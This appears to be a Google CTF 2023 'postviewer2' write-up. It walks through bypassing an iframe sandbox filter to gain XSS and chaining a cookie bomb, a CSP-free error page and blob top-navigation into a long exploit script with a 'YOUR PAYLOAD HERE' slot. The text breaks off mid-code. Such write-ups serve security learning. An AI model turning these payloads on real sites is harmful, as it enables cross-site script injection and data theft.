<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^https?:\/\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token constant">TRUSTED_ORIGIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Untrusted Origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token constant">DEFAULT_STYLE</span> <span class="token operator">=</span> <span class="token string">'position:absolute; top:0; left:0; bottom:0; right:0; width:100vw; height:100vh; border:none; margin:0; padding:0; z-index:999999;'</span>
    window<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> forbidden_sbx <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">allow-same-origin</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>origin <span class="token operator">!==</span> <span class="token constant">TRUSTED_ORIGIN</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Wrong origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>body <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> <span class="token operator">!</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>mimeType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"No content to render"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    
        <span class="token keyword">const</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>body<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">type</span><span class="token operator">:</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>mimeType
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        iframe<span class="token punctuation">.</span>style<span class="token punctuation">.</span>cssText <span class="token operator">=</span> <span class="token constant">DEFAULT_STYLE</span><span class="token punctuation">;</span>
        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
        iframe<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> value <span class="token keyword">of</span> e<span class="token punctuation">.</span>data<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>forbidden_sbx<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>iframe<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span><span class="token function">supports</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Unsupported value: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>value<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">continue</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                iframe<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        
        iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span class="token punctuation">;</span>
        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
        window<span class="token punctuation">.</span>onmessage <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        e<span class="token punctuation">.</span>source<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token string">'blob loaded'</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The received content is turned into a blob and then placed in a sandbox iframe. Our goal is to steal the content inside this iframe.</p>
<p>There are a few troublesome points:</p>
<ol>
<li>The admin bot has restrictions. We cannot open new windows, and any functionality similar to <code>window.open</code> is not allowed.</li>
<li>The CSP of the main domain is: <code>frame-ancestors *.postviewer2-web.2023.ctfcompetition.com; frame-src *.postviewer2-web.2023.ctfcompetition.com</code></li>
<li>The CSP of the sbx domain is: <code>frame-src blob:</code></li>
</ol>
<p>Firstly, we can easily obtain XSS on any sbx domain, like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>
url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> url

iframe<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    iframe<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">body</span><span class="token operator">:</span><span class="token string">"&lt;script>alert(document.domain)&lt;/script>"</span><span class="token punctuation">,</span> <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"allow-modals"</span><span class="token punctuation">,</span><span class="token string">"allow-scripts"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Now, the question is, what can we do next?</p>
<p>Our first step should be finding a way to bring the main domain into an iframe to perform further operations. However, the sbx domain only allows embedding pages starting with <code>blob:</code>, so how do we proceed?</p>
<p>At this point, we thought of using a cookie bomb to make the sbx domain return <code>HTTP/2 413 Request Entity Too Large</code>, which would remove the CSP error page.</p>
<p>The process is as follows:</p>
<ol>
<li>Load our own webpage first.</li>
<li>Embed an sbx iframe to obtain XSS.</li>
<li>Write a cookie from the sbx iframe to prevent loading of the &#x2F;bomb path.</li>
<li>Add another iframe with &#x2F;bomb, which has no CSP.</li>
<li>From the iframe in step 2, directly modify the content of the iframe in step 4 to obtain an XSS without CSP.</li>
<li>Now we can embed the main domain inside the iframe.</li>
</ol>
<p>Steps 1 to 5 are correct, but step 6 is incorrect. Although there is no longer the restriction of <code>frame-src blob:</code>, the <code>frame-ancestors *.postviewer2-web.2023.ctfcompetition.com;</code> of the main domain refers to all parent pages. So, as long as our top-level page is our own, we cannot bypass the CSP.</p>
<p>Then I suddenly thought of using a blob, like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;h1>hello&lt;/h1>&lt;iframe src="http://127.0.0.1:5000/test">&lt;/iframe>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
url <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
location <span class="token operator">=</span> url<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>This way, the top-level domain becomes <code>sbx-xxx.postviewer2-web.2023.ctfcompetition.com</code>, which satisfies the CSP.</p>
<p>However, an error occurred during the attempt:</p>
<blockquote>
<p>Unsafe attempt to initiate navigation for frame with origin ‘<a target="_blank" rel="noopener" href="http://localhost:3000/">http://localhost:3000/</a>‘ from frame with URL ‘blob:<a target="_blank" rel="noopener" href="https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/a15c526d-a65b-45ba-b99f-293595eb8818">https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/a15c526d-a65b-45ba-b99f-293595eb8818</a>‘. The frame attempting to navigate the top-level window is cross-origin and either it or one of its ancestors is not allowed to navigate the top frame.</p>
</blockquote>
<p>Later, my teammate found that adding the sandbox attribute to the iframe resolved the issue: <code>frame.sandbox = &#39;allow-modals allow-scripts allow-top-navigation allow-same-origin&#39;</code>. This behavior is worth recording because I thought that not having the sandbox attribute would provide more permissions, but it turns out that adding the sandbox attribute is necessary.</p>
<p>So the updated process is as follows:</p>
<ol>
<li>Load our own webpage first.</li>
<li>Embed an sbx iframe (f1) to obtain XSS.</li>
<li>Write a cookie from frame1 to prevent loading the &#x2F;bomb path.</li>
<li>Add another iframe for &#x2F;bomb (f2) without CSP.</li>
<li>Add another iframe (f3) for executing operations.</li>
<li>Modify the HTML of f2 from f3, where the script written will add a blob HTML and then change the top.location.</li>
<li>Successfully load the blob without any CSP.</li>
<li>Load the main domain iframe on the blob page.</li>
</ol>
<p>At this point, the exploit has already reached 100 lines and is extremely complex:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token keyword">function</span> <span class="token function">createBombFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">let</span> bombFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>
    url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
    bombFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> url

    bombFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'bombFrame created'</span><span class="token punctuation">)</span>
      bombFrame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
          &lt;script>
            const domain = document.domain
            const cookieCount = 10
            const cookieLength = 3000
            const expireAfterMinute = 5
            setCookieBomb()

            function setCookie(key, value) &#123;
              const expires = new Date(+new Date() + expireAfterMinute * 60 * 1000);
              const v = key + '=' + value + '; path=/bomb; domain=' + domain + '; Secure; SameSite=None; expires=' + expires.toUTCString()
              parent.document.cookie = v
            &#125;

            function setCookieBomb() &#123;
              const value = 'Boring' + '_'.repeat(cookieLength)
              for (let i=0; i&lt;cookieCount; i++) &#123;
                setCookie('key' + i, value);
              &#125;
            &#125;
          &lt;\/script></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
        <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"allow-modals"</span><span class="token punctuation">,</span> <span class="token string">"allow-scripts"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>bombFrame<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">function</span> <span class="token function">createBrokenFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">let</span> brokenFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>
      url <span class="token operator">=</span> <span class="token string">'https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/bomb'</span>
      brokenFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> url
      brokenFrame<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> <span class="token string">'allow-modals allow-scripts allow-top-navigation allow-same-origin'</span>
      brokenFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'brokenFrame loaded'</span><span class="token punctuation">)</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      brokenFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'brokenFrame error'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>brokenFrame<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">function</span> <span class="token function">createXssFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'createXssFrame'</span><span class="token punctuation">)</span>
    window<span class="token punctuation">.</span>xssFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>
    url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
    xssFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> url
    xssFrame<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> <span class="token string">'allow-modals allow-scripts allow-top-navigation allow-same-origin'</span>
    xssFrame<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
            const blob = new Blob(['&lt;html>&lt;head>&lt;script src="YOUR PAYLOAD HERE" />&lt;script>alert(1)&lt;/scr' + 'ipt>&lt;/head>&lt;body>&lt;div />&lt;/body>&lt;/html>'], &#123;
                type: 'text/html'
            &#125;);
            url = URL.createObjectURL(blob)
            console.log(url)
            window.top.location = url
    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>

    xssFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'xss frame loaded'</span><span class="token punctuation">)</span>

      window<span class="token punctuation">.</span>xssFrame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
          &lt;script>
            top.frames[1].document.open()
            console.log('writing');
            console.log('&lt;script>' + window.parent.name + '&lt;/scr' + 'ipt>');
            top.frames[1].document.write('&lt;script>' + window.parent.name + '&lt;/scr' + 'ipt>')
          &lt;\/script></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"allow-modals"</span><span class="token punctuation">,</span> <span class="token string">"allow-scripts"</span><span class="token punctuation">,</span> <span class="token string">"allow-top-navigation"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>xssFrame<span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">createBombFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"sleeping"</span><span class="token punctuation">)</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"creating broken frame"</span><span class="token punctuation">)</span>
    <span class="token keyword">await</span> <span class="token function">createBrokenFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token function">createXssFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>

  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'got message'</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The main purpose of doing all these steps is just to load the main domain as an iframe, that’s it.</p>
<p>However, we encountered a roadblock and couldn’t bypass this part:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">previewIframe</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> shimUrl<span class="token punctuation">,</span> container<span class="token punctuation">,</span> sandbox <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'allow-scripts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>shimUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
    url<span class="token punctuation">.</span>host <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">sbx-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">generateRandomPart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>
    container<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
    iframe<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
